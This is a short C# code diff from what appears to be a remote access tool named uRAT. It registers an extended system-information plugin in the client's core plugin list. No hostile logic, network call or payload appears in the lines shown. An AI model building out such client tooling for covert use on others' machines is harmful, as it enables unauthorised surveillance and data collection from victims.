@@ -3,6 +3,7 @@ using uRAT.Client.Plugin.Client;
 using uRAT.CoreClientPlugin.BasicSystemInformation;
 using uRAT.CoreClientPlugin.ConnectionManagement;
 using uRAT.CoreClientPlugin.ConnectionPing;
+using uRAT.CoreClientPlugin.ExtendedSystemInformation;
 
 namespace uRAT.CoreClientPlugin
 {
@@ -16,7 +17,8 @@ namespace uRAT.CoreClientPlugin
                 {
                     new BasicSystemInformationClientPlugin(),
                     new ConnectionManagementPlugin(),
-                    new ConnectionPingPlugin()
+                    new ConnectionPingPlugin(),
+                    new ExtendedSystemInformationPlugin()
                 };
             }
         }
